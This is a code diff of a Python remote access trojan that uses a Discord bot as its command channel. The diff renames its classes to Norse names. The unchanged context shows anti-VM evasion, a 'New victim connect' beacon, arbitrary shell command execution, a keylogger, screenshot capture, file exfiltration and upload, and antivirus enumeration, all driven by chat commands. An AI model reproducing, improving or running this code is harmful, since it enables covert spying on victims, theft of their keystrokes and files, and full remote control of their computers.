@@ -24,10 +24,10 @@ Key = pynput.keyboard.Key
 Listener = pynput.keyboard.Listener
 
 
-class Defense:
+class Thor:
 
     def check_for_vms(self):
-        platform = Utils().platform()
+        platform = Heimdall().platform()
         rules = ['Virtualbox', 'vmbox', 'vmware']
         if platform == 'win32':
             command = subprocess.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=subprocess.PIPE,
@@ -51,7 +51,7 @@ class Defense:
                     sys.exit()
 
 
-class KeyL:
+class MjolnirKeyL:
 
     def __init__(self):
         self.keys = []
@@ -79,7 +79,7 @@ class KeyL:
             listener.join()
 
 
-class Screen:
+class Mjolnir:
 
     def screenshot_win(self):
         from mss.windows import MSS as mss
@@ -113,7 +113,7 @@ class Screen:
         return "This file can't be uploaded on discord, trying to figure out how to upload big files to a public server"
 
 
-class Utils:
+class Heimdall:
 
     def get_system_info(self):
         return {
@@ -158,20 +158,17 @@ class Utils:
         latitude, longitude = json_data.get('loc').split(',')
         return latitude, longitude
 
-
-class Verification:
-
     def mac_verification(self, message):
-        if re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', message).group() == Utils().mac_address():
+        if re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', message).group() == Heimdall().mac_address():
             return True
         else:
             return False
 
 
-class DiscordRaven(discord.Client):
+class Bifrost(discord.Client):
     async def on_ready(self):
         channel = self.get_channel(CHANNEL_ID)
-        mac = Utils().mac_address().upper()
+        mac = Heimdall().mac_address().upper()
         message = f'```New victim connect: \n' \
                   f'mac_address     -->     {mac}\n' \
                   f'To interact with the victim, type %help {mac} to see the help message```'
@@ -199,12 +196,12 @@ class DiscordRaven(discord.Client):
         if '%' in message.content.lower():
 
             if received_message.startswith('%sessions'):
-                return await message.channel.send(f'```Victim: {Utils().mac_address().upper()} is connected```')
+                return await message.channel.send(f'```Victim: {Heimdall().mac_address().upper()} is connected```')
 
-            if Verification().mac_verification(received_message.lower()):
+            if Heimdall().mac_verification(received_message.lower()):
 
                 if received_message.startswith('%show'):
-                    sys_data = Utils().get_system_info()
+                    sys_data = Heimdall().get_system_info()
                     data_message = f'```Sys Data: \n' \
                                    f'Plataform       -->     {sys_data["platform"]}\n' \
                                    f'plublic_IP      -->     {sys_data["plublic_internet_protocol"]}\n' \
@@ -220,7 +217,7 @@ class DiscordRaven(discord.Client):
                         f'{data_message}')
 
                 if received_message.startswith('%help'):
-                    mac = Utils().mac_address().upper()
+                    mac = Heimdall().mac_address().upper()
                     help_message = ["""
 Connected sessions:
             ```
@@ -319,7 +316,7 @@ Example: %antivirus """ + mac + """```"""]
                         await message.channel.send(f'{msg}')
 
                 if received_message.startswith('%scmd'):
-                    command = received_message.split(f'%scmd {Utils().mac_address().upper()} ')[1]
+                    command = received_message.split(f'%scmd {Heimdall().mac_address().upper()} ')[1]
                     command = subprocess.Popen(command.split(), stderr=subprocess.PIPE, stdin=subprocess.DEVNULL,
                                                stdout=subprocess.PIPE, shell=True, text=True, creationflags=0x08000000)
                     out, err = command.communicate()
@@ -327,19 +324,19 @@ Example: %antivirus """ + mac + """```"""]
                     await self.sc(out, message)
 
                 if received_message.startswith('%screenshot'):
-                    platform = Utils().platform()
+                    platform = Heimdall().platform()
                     if platform == 'win32':
-                        await message.channel.send(file=discord.File(f'{Screen().screenshot_win()}'))
+                        await message.channel.send(file=discord.File(f'{Mjolnir().screenshot_win()}'))
                     elif platform == 'linux':
-                        await message.channel.send(file=discord.File(f'{Screen().screenshot_linux()}'))
+                        await message.channel.send(file=discord.File(f'{Mjolnir().screenshot_linux()}'))
                     else:
-                        await message.channel.send(file=discord.File(f'{Screen().screenshot_macos()}'))
+                        await message.channel.send(file=discord.File(f'{Mjolnir().screenshot_macos()}'))
                     os.remove('fullscreen.png')
 
                 if received_message.startswith('%keylogger'):
                     if re.search('start', received_message, re.IGNORECASE):
                         stop_logger = False
-                        keyl = KeyL()
+                        keyl = MjolnirKeyL()
                         thread = Thread(target=keyl.start)
                         thread.start()
                         await message.channel.send(f'```Keylogger has started```')
@@ -352,15 +349,15 @@ Example: %antivirus """ + mac + """```"""]
 
                 if received_message.startswith('%download'):
                     try:
-                        file_path = received_message.split(f'%download {Utils().mac_address().upper()} ')[1]
+                        file_path = received_message.split(f'%download {Heimdall().mac_address().upper()} ')[1]
                         await message.channel.send(file=discord.File(file_path))
                     except Exception:
-                        file_path = received_message.split(f'%download {Utils().mac_address().upper()} ')[1]
-                        await message.channel.send(f'```{Screen().upload_file(file_path)}```')
+                        file_path = received_message.split(f'%download {Heimdall().mac_address().upper()} ')[1]
+                        await message.channel.send(f'```{Mjolnir().upload_file(file_path)}```')
 
                 if received_message.startswith('%upload'):
-                    local_remote = received_message.split(f'%upload {Utils().mac_address().upper()} ')[1].split()
-                    await message.channel.send(f'```{Screen().download_file(local_remote[0], local_remote[1])}```')
+                    local_remote = received_message.split(f'%upload {Heimdall().mac_address().upper()} ')[1].split()
+                    await message.channel.send(f'```{Mjolnir().download_file(local_remote[0], local_remote[1])}```')
 
                 if received_message.startswith('%mic'):
                     await message.channel.send(f'```Under development```')
@@ -374,7 +371,7 @@ Example: %antivirus """ + mac + """```"""]
                     await self.voice_clients[0].disconnect()
 
                 if received_message.startswith('%antivirus'):
-                    platform = Utils().platform()
+                    platform = Heimdall().platform()
                     if platform == 'win32':
                         command = subprocess.Popen(
                             ['wmic', r'/Namespace:\\root\SecurityCenter2', 'path', 'AntiVirusProduct', 'get',
@@ -390,6 +387,6 @@ Example: %antivirus """ + mac + """```"""]
                 return
 
 
-Defense().check_for_vms()
-client = DiscordRaven()
+Thor().check_for_vms()
+client = Bifrost()
 client.run(TOKEN)
